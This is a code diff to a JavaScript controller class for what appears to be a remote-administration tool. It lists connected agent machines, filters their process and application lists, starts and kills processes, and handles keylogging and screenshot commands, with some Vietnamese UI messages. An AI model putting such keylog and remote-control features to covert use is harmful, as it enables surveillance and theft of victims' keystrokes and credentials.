@@ -25,6 +25,40 @@ export class Gateway{
         this.ui = window.ui || { log: console.log, renderList: console.table };
 
         this.agentsList = [];
+        this.lastAppList = [];
+        this.lastProcessList = [];
+    }
+
+    getFormattedAgents(filter = "") {
+        return this.agentsList
+            .filter(a => 
+                a.id.toLowerCase().includes(filter.toLowerCase()) || 
+                a.ip.includes(filter) || 
+                a.machineId.toLowerCase().includes(filter.toLowerCase())
+            )
+            .map(a => ({
+                "ID": a.id,
+                "IP Address": a.ip,
+                "Machine": a.machineId,
+                "Status": "Online"
+            }));
+    }
+
+    getFormattedData(type, filter = "") {
+        const rawData = type === 'APP' ? this.lastAppList : this.lastProcessList;
+        if (!rawData || !Array.isArray(rawData)) return [];
+        
+        return rawData
+            .filter(item => {
+                if (!filter) return true;
+                const name = item.name || item.ProcessName || "";
+                return name.toLowerCase().includes(filter.toLowerCase());
+            })
+            .map(item => ({
+                "ID/PID": item.id !== undefined ? item.id : (item.PID !== undefined ? item.PID : 'N/A'),
+                "Name": item.name || item.ProcessName || 'Unknown',
+                "Path/Status": item.path || item.Status || "Running"
+            }));
     }
 
     findAgentId(input) {
@@ -157,8 +191,12 @@ export class Gateway{
         this.send(CONFIG.CMD.GET_AGENTS, {});
     }
 
-    fetchProcessList() {
-        this.send(CONFIG.CMD.PROC_LIST, "");
+    fetchProcessList(query = "") {
+        if (query) {
+            this.send(CONFIG.CMD.PROC_LIST, { query: query });
+        } else {
+            this.send(CONFIG.CMD.PROC_LIST, "");
+        }
     }
 
     startProcess(id) {
@@ -169,8 +207,12 @@ export class Gateway{
         this.send(CONFIG.CMD.PROC_KILL, String(id));
     }
 
-    fetchAppList() {
-        this.send(CONFIG.CMD.APP_LIST, "");
+    fetchAppList(query = "") {
+        if (query) {
+            this.send(CONFIG.CMD.APP_LIST, { query: query });
+        } else {
+            this.send(CONFIG.CMD.APP_LIST, "");
+        }
     }
 
     startApp(id) {
@@ -210,10 +252,18 @@ export class Gateway{
                     } 
                     break;
                 case CONFIG.CMD.PROC_LIST:
-                    this.ui.renderList('Process List', msg.data);
+                    this.lastProcessList = msg.data;
+                    this.ui.renderList('Process List', this.getFormattedData('PROC'));
+                    if (this.callbacks.onProcessListUpdate) {
+                        this.callbacks.onProcessListUpdate(msg.data);
+                    }
                     break;
                 case CONFIG.CMD.APP_LIST:
-                    this.ui.renderList('Application List', msg.data);
+                    this.lastAppList = msg.data;
+                    this.ui.renderList('Application List', this.getFormattedData('APP'));
+                    if (this.callbacks.onAppListUpdate) {
+                        this.callbacks.onAppListUpdate(msg.data);
+                    }
                     break;
                 case CONFIG.CMD.PROC_START:
                 case CONFIG.CMD.PROC_KILL:
@@ -222,6 +272,16 @@ export class Gateway{
                 case CONFIG.CMD.START_KEYLOG:
                 case CONFIG.CMD.STOP_KEYLOG:
                     this._handleCommandResult(msg.type, msg.data);
+                    break;
+                case CONFIG.CMD.SAVE_KEYLOG:
+                    if (msg.data && msg.data.status === 'ok') {
+                        this.ui.log('Keylog', `Đã lưu keylog: ${msg.data.filename || 'thành công'}`);
+                        if (msg.data.path) {
+                            console.log(`[Keylog] File saved at: ${msg.data.path}`);
+                        }
+                    } else {
+                        this.ui.error('Keylog', msg.data.msg || 'Lỗi khi lưu keylog');
+                    }
                     break;
                 case CONFIG.CMD.SCREENSHOT:
                     if (msg.data && msg.data.status === 'ok') {
@@ -277,4 +337,6 @@ export class Gateway{
             this.ui.log('Error', data.msg);
         }
     }
+
+
 }
